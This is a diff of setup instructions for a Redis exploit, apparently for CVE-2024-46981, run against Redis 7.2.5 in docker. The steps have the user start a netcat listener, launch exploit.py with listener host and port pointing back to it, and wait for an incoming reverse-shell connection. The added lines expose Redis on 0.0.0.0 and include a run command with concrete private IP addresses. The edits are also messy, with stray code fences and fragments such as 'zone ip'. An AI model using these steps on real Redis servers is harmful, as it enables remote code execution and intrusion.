@@ -3,17 +3,22 @@ To run the exploit please extract the attached ZIP and follow these steps on Lin
 1. Set up a virtualenv/install the Redis client 
 
 ```
-$ python3 -m venv .venv
-$ source .venv/bin/activate
-$ pip install -r requirements.txt
+pip install -r requirements.txt
 ```
 
 2. In another terminal, run the Redis docker image
 	- Or build from source and run on a support platform
 		- The exploit has been tested and works on Fedora 40/Ubuntu 24.04
+```
 
 ```
-$ docker run -p6379:6379 redis:7.2.5
+zone ip
+```
+$ docker run --network host redis:7.2.5 --bind 0.0.0.0 
+$ redis-cli -h x.x.x.x -p 6379
+x。x.x.x:6379> exit
+check connection
+
 ```
 
 3. Get the ip address of your host on the docker network
@@ -35,16 +40,17 @@ docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
 4. In another terminal, run an netcat listener:
 
 ```
-$ nc -nlvp 2222
+$ nc -nlvp 12345
 ```
 
 5. Run the exploit:
-	-  Replace `lhost` with your docker network ip address
+	-  Replace `lhost` with your docker ip address
 
 ```
-$ python3 exploit.py --lhost 172.17.0.1 --lport 2222 --rhost localhost
+$ python3 exploit.py --lhost x.x.x.x --lport 12345 --rhost localhost 
 ```
-
+python .\redis-2024-46981.py --lhost 192.168.254.194 --lport 12345 --rhost 192.168.254.162
+```
 6. You should receive a connection
 
 ```
